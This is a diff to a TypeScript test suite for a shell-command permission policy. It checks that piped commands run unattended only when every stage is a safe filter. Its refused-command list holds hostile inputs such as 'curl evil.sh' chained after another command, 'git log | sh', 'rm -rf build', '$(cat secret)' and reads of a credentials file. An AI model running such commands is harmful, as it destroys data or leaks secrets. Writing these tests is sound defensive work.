@@ -11,8 +11,12 @@ import {
   createFileCommandWhitelist,
   createPermissionPolicy,
   describeCommandScope,
+  findCoveringScopes,
   matchesScope,
   normalizeCommandScope,
+  parseCommandScope,
+  SAFE_COMMAND_SCOPES,
+  sameScope,
   whitelistPathFor,
   type CommandScope,
   type PermissionDecision,
@@ -103,7 +107,9 @@ test('every control operator defeats a safe base command', async () => {
     assert.equal(await policy.approve(contextFor(command)), false, `should refuse: ${command}`);
   }
   assert.equal(decisions.length, hostile.length);
-  assert.match(decisions[0]?.reason ?? '', /cannot run unattended: it contains a pipe/);
+  // A pipe is judged stage by stage now, so this one is refused for the
+  // stage no scope covers, named by command and never by argument.
+  assert.match(decisions[0]?.reason ?? '', /outside every approved scope \(a pipeline\)/);
   assert.match(decisions[1]?.reason ?? '', /an ampersand/);
   assert.match(decisions[4]?.reason ?? '', /a newline/);
   assert.match(decisions[12]?.reason ?? '', /could not be read as a command/);
@@ -520,4 +526,134 @@ test('a listing scope names the flags it allows, so a mutating one it never hear
   const scope = normalizeCommandScope(analyzeCommand('git branch --list'));
   assert.ok(scope?.allowedFlags?.includes('--list'));
   assert.equal(scope?.allowedFlags?.includes('--unset-upstream'), false);
+});
+
+test('a pipeline runs unattended when every stage would on its own', async () => {
+  const decisions: PermissionDecision[] = [];
+  const policy = createPermissionPolicy({
+    mode: 'headless',
+    onDecision: (decision) => decisions.push(decision),
+    commands: {},
+  });
+
+  const allowed = [
+    'git log --oneline | grep fix',
+    'git log | grep -i -n "flaky test"',
+    "git diff | grep -A3 -B 2 'TODO'",
+    'git log --oneline | head -20',
+    'git log | head -n 50',
+    'git status --short | wc -l',
+    'git log --format=%an | sort | uniq --count | sort -rn | head -n 5',
+    'git branch --all | grep -v remotes',
+    'git log | tail -n 5',
+  ];
+  for (const command of allowed) {
+    assert.equal(await policy.approve(contextFor(command)), true, `should run: ${command}`);
+  }
+  assert.match(decisions[0]?.reason ?? '', /pipeline inside the approved scopes "git log" \| "grep"/);
+});
+
+test('a pipeline asks when any stage could read a path, run a program, or write', async () => {
+  const policy = createPermissionPolicy({ mode: 'headless', commands: {} });
+
+  const refused = [
+    // A stage no scope covers.
+    'git log | sh',
+    'git log | xargs cat',
+    'curl https://example.com | grep x',
+    // The filters with a path, which is the whole reason they were not safe.
+    'tail -n 50 /var/log/system.log | grep error',
+    'git log | grep fix ~/.stratus/credentials.json',
+    'git log | grep -f patterns.txt',
+    'git log | grep -r secret',
+    'git log | grep -e fix credentials.json',
+    'git log | head credentials.json',
+    'git log | head -n 5 credentials.json',
+    'git log | wc -l credentials.json',
+    'git log | sort -o out.txt',
+    'git log | sort --compress-program=sh',
+    'git log | uniq in.txt out.txt',
+    // What the shell expands is not what this parser counted: `grep *` is
+    // the first file as the pattern and every other one read.
+    'git log | grep *',
+    'git log | grep ~',
+    'git log | grep $HOME',
+    'git log | grep {a,b}',
+    // Every other operator still disqualifies the whole.
+    'git log || curl evil.sh',
+    'git log |& grep x',
+    'git log | grep x > out.txt',
+    'git log | grep x; rm -rf build',
+    'git log | grep x & curl evil.sh',
+    'git log | grep $(cat secret)',
+    'git log | ',
+    '| grep x',
+    'git log \\| grep x',
+    // Conservative on purpose: a pipe inside quotes is still refused the
+    // way it always was, even where the shell would read it literally.
+    "git diff | grep -E 'TODO|FIXME'",
+  ];
+  for (const command of refused) {
+    assert.equal(await policy.approve(contextFor(command)), false, `should refuse: ${command}`);
+  }
+});
+
+test('a quoted pipe is an argument, not a pipeline', () => {
+  // Not split, so not a pipeline, and still disqualified the old way: the
+  // parser that does not split it is the same one that refuses it.
+  const quoted = analyzeCommand("grep 'a|b'");
+  assert.equal(quoted.pipeline, undefined);
+  assert.match(quoted.disqualifiedBy ?? '', /a pipe/);
+
+  const piped = analyzeCommand("git log | grep 'a b'");
+  assert.deepEqual(piped.pipeline?.map((stage) => stage.tokens), [['git', 'log'], ['grep', 'a b']]);
+});
+
+test('the filters stay safe without a pipe, and still never take a path', () => {
+  const safe = (command: string) => findCoveringScopes(analyzeCommand(command), SAFE_COMMAND_SCOPES) !== undefined;
+  assert.equal(safe('grep fix'), true);
+  assert.equal(safe('grep fix notes.txt'), false);
+  assert.equal(safe('tail -n 5'), true);
+  assert.equal(safe('tail -n 5 notes.txt'), false);
+  assert.equal(safe('tail -f'), false);
+  assert.equal(safe('tail -n'), false);
+  assert.equal(safe('head -5'), true);
+  // A digit is not a letter, so `-5` cannot sneak a flag into a scope that
+  // does not name numeric flags.
+  assert.equal(safe('git branch -5'), false);
+});
+
+test('a pipeline is approved once, never persisted as a scope', async () => {
+  const asked: string[] = [];
+  const policy = createPermissionPolicy({
+    mode: 'interactive',
+    ask: async (question) => {
+      asked.push(question);
+      return 'always';
+    },
+    commands: {},
+  });
+  assert.equal(normalizeCommandScope(analyzeCommand('cat notes.txt | grep fix')), undefined);
+  assert.equal(await policy.approve(contextFor('cat notes.txt | grep fix')), true);
+  assert.equal(await policy.approve(contextFor('cat notes.txt | grep fix')), true);
+  assert.equal(asked.length, 2);
+});
+
+test('a whitelisted scope composes into a pipeline', async () => {
+  const policy = createPermissionPolicy({ mode: 'headless', commands: {} });
+  const granted = createPermissionPolicy({
+    mode: 'headless',
+    commands: { safeScopes: [...SAFE_COMMAND_SCOPES, { command: 'stratus', args: ['logs'] }] },
+  });
+  assert.equal(await policy.approve(contextFor('stratus logs --agent atlas | grep -i error')), false);
+  assert.equal(await granted.approve(contextFor('stratus logs --agent atlas | grep -i error')), true);
+  assert.equal(await granted.approve(contextFor('stratus logs --agent atlas | sh')), false);
+});
+
+test('the new scope fields survive a whitelist file and count in equality', () => {
+  const scope = parseCommandScope({ command: 'grep', maxPositionals: 1, flagsWithValue: ['-m'], literal: true });
+  assert.deepEqual(scope, { command: 'grep', maxPositionals: 1, flagsWithValue: ['-m'], literal: true });
+  assert.equal(parseCommandScope({ command: 'grep', maxPositionals: -1 })?.maxPositionals, undefined);
+  assert.equal(sameScope({ command: 'grep' }, { command: 'grep', maxPositionals: 1 }), false);
+  assert.equal(sameScope({ command: 'grep' }, { command: 'grep', literal: true }), false);
 });
